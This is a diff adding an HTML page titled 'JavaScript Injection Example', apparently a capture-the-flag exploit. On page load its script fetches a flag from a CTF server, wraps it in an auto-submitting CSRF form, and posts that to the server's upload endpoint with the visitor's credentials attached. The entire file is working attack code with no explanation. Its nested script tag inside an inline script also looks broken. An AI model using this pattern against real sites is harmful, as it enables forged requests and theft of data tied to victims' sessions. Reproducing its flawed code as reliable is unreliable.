@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>JavaScript Injection Example</title>
+    <script>
+        window.onload = function() {
+            var xhr = new XMLHttpRequest();
+            var formData = new FormData();
+
+            // Step 1: Fetch the flag from the server
+            var flagUrl = 'http://ctf.widyasecurity.com/getflag';
+            
+            var flagRequest = new XMLHttpRequest();
+            flagRequest.open('GET', flagUrl, true);
+            flagRequest.onreadystatechange = function() {
+                if (flagRequest.readyState === 4 && flagRequest.status === 200) {
+                    var flag = flagRequest.responseText.trim();
+
+                    // Step 2: Construct the CSRF payload with the flag
+                    var csrfPayload = `
+                        <html>
+                        <body>
+                            <form id="csrfForm" action="http://ctf.widyasecurity.com/upload" method="POST">
+                                <input type="hidden" name="qrcode" value="flag=${encodeURIComponent(flag)}">
+                            </form>
+                            <script>
+                                document.getElementById('csrfForm').submit();
+                            </script>
+                        </body>
+                        </html>
+                    `;
+
+                    var blob = new Blob([csrfPayload], { type: 'text/html' });
+
+                    formData.append('qrcode', blob);
+
+                    // Step 3: Send the CSRF payload to the server
+                    xhr.open('POST', 'http://ctf.widyasecurity.com/upload', true);
+                    xhr.setRequestHeader('Content-Type', 'multipart/form-data'); // Adjust content type if necessary
+                    xhr.withCredentials = true;
+
+                    xhr.onload = function() {
+                        if (xhr.status === 200) {
+                            console.log('CSRF Payload sent successfully');
+                            // Optionally redirect or perform other actions on success
+                        } else {
+                            console.error('CSRF Payload failed to send. Status: ' + xhr.status);
+                        }
+                    };
+
+                    xhr.onerror = function() {
+                        console.error('CSRF Request failed');
+                    };
+
+                    xhr.send(formData);
+                }
+            };
+
+            flagRequest.onerror = function() {
+                console.error('Failed to fetch flag');
+            };
+
+            flagRequest.send();
+        };
+    </script>
+</head>
+<body>
+</body>
+</html>
